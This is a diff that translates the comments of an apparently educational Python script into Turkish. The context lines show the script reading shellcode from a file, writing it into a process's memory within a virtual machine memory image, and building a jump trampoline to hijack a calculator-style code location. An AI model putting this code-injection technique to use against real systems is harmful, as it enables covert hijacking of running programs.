@@ -14,7 +14,7 @@ memory_file = "/Users/justin/Documents/Virtual Machines.localized/" \
 slack_space = None
 trampoline_offset = None
 
-# read in our shellcode
+# shell kodumuzda oku
 sc_fd = open("cmeasure.bin", "rb")
 sc = sc_fd.read()
 sc_fd.close()
@@ -62,7 +62,7 @@ for process in p.calculate():
                         fd.write(sc.decode())
                         fd.flush()
 
-                        # create our trampoline
+                        # trampoline oluştur
                         tramp = "\xbb%s" % struct.pack("<L", page[0] + offset)
                         tramp += "\xff\xe3"
 
@@ -74,13 +74,13 @@ for process in p.calculate():
 
                     fd.close()
 
-                # check for our target code location
+                # hedef kod konumumuzu kontrol edin
                 if page[0] <= equals_button < ((page[0] + page[1]) - 7):
 
-                    # calculate virtual offset
+                    # sanal offset'i hesapla
                     v_offset = equals_button - page[0]
 
-                    # now calculate physical offset
+                    # şimdi fiziksel offset'i hesapla
                     trampoline_offset = physical + v_offset
 
                     print("[*] Found our trampoline target at: 0x%08x" % (
